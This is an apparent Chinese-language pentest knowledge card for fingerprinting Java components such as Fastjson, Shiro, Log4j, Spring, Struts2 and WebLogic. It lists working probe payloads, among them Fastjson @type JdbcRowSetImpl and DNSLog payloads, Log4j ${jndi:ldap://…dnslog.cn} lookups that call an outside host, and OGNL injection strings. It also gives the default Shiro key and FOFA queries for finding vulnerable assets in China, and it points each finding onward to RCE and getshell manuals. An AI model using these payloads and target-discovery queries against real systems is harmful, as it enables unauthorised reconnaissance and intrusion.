---
name: kb_java_component_fingerprint_2026
description: Java 组件精准指纹识别卡—Fastjson/Shiro/Log4j/Spring/Struts2/WebLogic/Tomcat/JBoss 五维指纹(响应头/Set-Cookie/报错/路径/icon)+FOFA语法+主动探测确认
metadata:
  node_type: knowledge
  type: reference
  modified: 2026-08-13
---

# Java 组件精准指纹识别卡 (2026版)

> 目标：**精准发现信息** — 命中组件后 0 误判，直接接利用手册。
> 配合: `techniques/kb_java_deserialization_2026.md`（gadget/利用） + `techniques/kb_fastjson_shiro_log4j_master_2026.md`（三件套链路）+ `srcwiki_poc/{分类}/_index.md`（POC 直打）
> 优先级: **主动探测 > 被动指纹**（主动探测确认最可靠，避免被指纹投毒/伪造页面骗）

## 五维指纹法（对每个组件逐项收集）

| 维度 | 看什么 | 可靠度 |
|------|--------|:---:|
| ① 响应头 | `Server` / `X-Powered-By` / `Set-Cookie` / 自定义头 | 高 |
| ② Set-Cookie | rememberMe/JSESSIONID 等会话特征 | 极高（组件特有） |
| ③ 报错信息 | 默认错误页/异常堆栈（类名暴露组件） | 极高（直接暴露 class） |
| ④ 默认路径/图标 | `/console` `/actuator` `/invoker` `/favicon.ico` hash | 中 |
| ⑤ 主动探测 | 发组件特定 payload 看差异响应 | **最高（确认依据）** |

**铁律**：
- 主动探测必须用**只读/低破坏** payload（DNS 外带/报错回显/无害请求），禁止探测时打 getshell
- 命中指纹 → 先查 `srcwiki_poc/{对应分类}/_index.md` 拿 A/B 级 POC 直打
- 误报重灾区：CDN/WAF 篡改响应头、自定义报错页、站群模板 — 主动探测二次确认后才定性

---

## 一、Fastjson（最优先，2026 有在野 0day）

### 被动指纹
- **报错特征**（主动触发解析错误）：
  - `com.alibaba.fastjson.JSONException`
  - `fastjson-1.2.x.jar!/`
  - `java.lang.ClassCastException: ... fastjson`
- **典型入口**：JSON body 接口、`Content-Type: application/json`、POST body 原样 JSON
- **触发报错**：向 JSON 接口提交 `{"x":`（截断 JSON）或 `{"@type":"xxx不存在类"}`

### 主动确认（低破坏，按序）
```
1) 报错回显: {"@type":"com.sun.rowset.JdbcRowSetImpl"}
   → 响应含 "ClassNotFound" / "ClassNotFoundException" = 解析了 @type = 存在
2) DNSLog:  {"@type":"java.net.Inet4Address","val":"xxxx.dnslog.cn"}
   {"@type":"java.net.Inet6Address","val":"xxxx.dnslog.cn"}
   {"@type":"java.net.InetSocketAddress"{"address":,"val":"xxxx.dnslog.cn"}}
   → DNSLog 收到解析请求 = 确认
3) 版本粗判: {"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"}
   → 返回 "class not found" vs "malformed" 可区分新旧版本行为
```

### FOFA（精准识别跑 Fastjson 的资产）
```
body="com.alibaba.fastjson.JSONException" && country="CN"
body="fastjson-1.2" && country="CN"
# 业务侧：内容型接口，多数需配合登录后业务 JSON 请求触发
```

### 版本→利用映射（接利用手册）
| 版本 | 链路 | 备注 |
|------|------|------|
| ≤1.2.24 | JdbcRowSetImpl→JNDI | 无限制 |
| ≤1.2.47 | Cache 绕过 AutoType | `Class`+`val` 双 @type |
| ≤1.2.68 | expectClass 白名单绕过 | 需第三方库 |
| ≤1.2.80 | groovy/jython/mysql | 三方库 |
| 1.2.83 及全部 1.x | **CVE-2026-16723** @JSONType resource probe | AutoType 关也中，jar:http/file 探测 |

---

## 二、Apache Shiro

### 被动指纹（特征极其明确）
- **Set-Cookie 头** `rememberMe=deleteMe`（最可靠，独一无二）
  - 正常访问无 rememberMe cookie 时，部分版本响应也会带 `rememberMe=deleteMe`
  - 同一请求带 `Cookie: rememberMe=xxx`（任意值）→ 响应 Set-Cookie 出现 `deleteMe` = **确认存在**
- **FOFA**：
  ```
  body="rememberMe=deleteMe"
  # 或 icon_hash（Shiro 默认 logo）
  ```
- **易误报**：某些框架自定义同名 cookie — 以「带 rememberMe 请求 → deleteMe 响应」为准

### 主动确认（只读）
```
GET / HTTP/1.1
Cookie: rememberMe=1
→ Set-Cookie: rememberMe=deleteMe  = Shiro 框架确认
```

### 版本与利用（接三件套手册）
| 特征 | 版本 | 可打 |
|------|------|------|
| 默认 key `kPH+bIxk5D2deZiIxcaaaA==` | ≤1.2.4 | Shiro-550 RCE |
| key 泄露/自定义弱 key | 任意 | 爆破 key → RCE |
| 未知 key | 任意 | Shiro-721 Padding Oracle |

---

## 三、Apache Log4j（几乎无指纹，靠全入口探测）

### 指纹本质
Log4j 是**库不是服务**，没有任何 HTTP 指纹。识别 = 找到**会用日志记录可控输入的入口**全量打 `JNDI lookup`。

### 高概率宿主（间接指纹）
| 宿主组件 | 入口 |
|---------|------|
| Apache Solr | `/solr/admin/cores?action=` |
| Struts2 | 任意 action 参数（OGNL + Log4j 双打） |
| VMware vCenter | 登录/API 头 |
| 各类 Java 后台登录/搜索/导出 | User-Agent/X-Forwarded-For/参数 全打 |

### 主动探测（无 JNDI 服务端也能判定）
```
1) DNSLog:   ${jndi:ldap://xxxx.dnslog.cn}
             ${jndi:ldap://${sys:java.version}.xxxx.dnslog.cn}  → 顺带带出版本
2) 无 JNDI 环境信息泄露: ${env:PATH} ${sys:java.version} ${java:version}
   若响应回显展开值 = 存在 lookup 解析
3) 全入口打: GET 参数 + POST body + 全部 Header（UA/XFF/Referer/Cookie）+ 文件名
```

### FOFA（找高危宿主，非找 log4j 本身）
```
app="APACHE-Solr" && country="CN"
app="VMware-vCenter" && country="CN"
```

---

## 四、Spring / Spring Boot

### 被动指纹
- **报错页** `Whitelabel Error Page`（Spring Boot 默认错误页）—— 极高确认
- **404 响应体** `There was an unexpected error (type=Not Found, status=404)`（新版）
- **响应头** `X-Application-Context`（老版本）/ 无 Server 头
- **默认路径** `/actuator` `/actuator/health` `/error` `/swagger-ui.html`
- **FOFA**：
  ```
  body="Whitelabel Error Page"
  body="There was an unexpected error"
  header="X-Application-Context"
  ```

### 主动确认（只读）
```
GET /actuator/env HTTP/1.1
→ 200 + JSON = Spring Boot Actuator 未脱敏（直接接 heapdump/env 链）
GET /actuator/health  → 200 {"status":"UP"}
```

### 利用面（命中即查）
- Actuator 未授权 → `/srcwiki_poc/开发框架漏洞/` + `techniques/kb_springboot_vulns_poc_2026.md`
- 框架漏洞（SpEL/Gateway）→ `srcwiki_poc/CVE-2026/` grep Spring

---

## 五、Struts2

### 被动指纹
- **报错** `Struts Problem Report` / `struts.devMode` / `.action` `.do` 后缀 action
- **响应头** 偶见 `X-Struts` 
- **FOFA**：
  ```
  body="struts2" && body="action"
  body="Struts Problem Report"
  ```

### 主动确认（OGNL 低破坏探测）
```
?%24%7B3*3%7D                    → 回显 9（OGNL 表达式执行）
?%24%7B233*233%7D                → 回显 54289
${%23a%3D1}.action               → 差异响应
```

---

## 六、WebLogic

### 被动指纹
- **端口**: 7001（console）/ 7002（IIOP/SSL）
- **默认路径**: `/console/` `/wls-wsat/` `/bea_wls_internal/`
- **报错**: `WebLogic Server` 字样 / `javax.servlet.ServletException` + weblogic 类
- **FOFA**：
  ```
  port="7001" && header="WebLogic"
  app="Oracle-WebLogic-Server"
  ```

### 主动确认
```
GET /console/login/LoginForm.jsp  → 200 WebLogic 登录
GET /wls-wsat/CoordinatorPortType → 存在（XMLDecoder 利用点）
```

---

## 七、Tomcat / JBoss / 通用容器

### Tomcat
- **响应头** `Server: Apache-Coyote/1.1` / `Server: Apache Tomcat/x.y.z`
- **默认路径** `/manager/html` `/host-manager` `/examples/`
- **报错** `Apache Tomcat/` 默认错误页 / 404 页面图标
- **FOFA**：`header="Apache-Coyote"` `app="APACHE-Tomcat"`

### JBoss
- **路径** `/invoker/readonly`（CVE-2017-12149）`/jmx-console/` `/web-console/`
- **报错** `JBoss Web` / `org.jboss` 类名
- **FOFA**：`app="JBoss"` `body="JBoss"`

### 通用容器决策树
```
Server 头 Apache-Coyote → Tomcat（进 midware-rce 秒杀）
Server 头 Apache + JSP 报错 → Tomcat/JBoss（看 /invoker 分流）
端口 7001 + WebLogic 字样 → WebLogic（T3/console/wls-wsat）
报错含 org.apache.struts2 → Struts2（OGNL）
Whitelabel Error Page → Spring Boot（actuator）
rememberMe=deleteMe → Shiro（key 爆破）
JSON 接口报 fastjson 类名 → Fastjson（2026 直接打）
```

---

## 指纹确认 → 利用 总流程

```
S1 命中组件指纹 → 记信号 [Java 组件: X]
  → 主动探测确认（只读 payload，2-3 发内判定）
  → 查 srcwiki_poc/{分类}/_index.md 取 A/B 级 POC
  → 三件套（fastjson/shiro/log4j）→ techniques/kb_fastjson_shiro_log4j_master_2026.md
  → 反序列化通用 → techniques/kb_java_deserialization_2026.md
  → 中间件 RCE → rce_getshell/kb_middleware_rce_master_2026.md
  → 2022-2026 新 CVE → rce_getshell/kb_middleware_cve_index_2022_2026.md
```
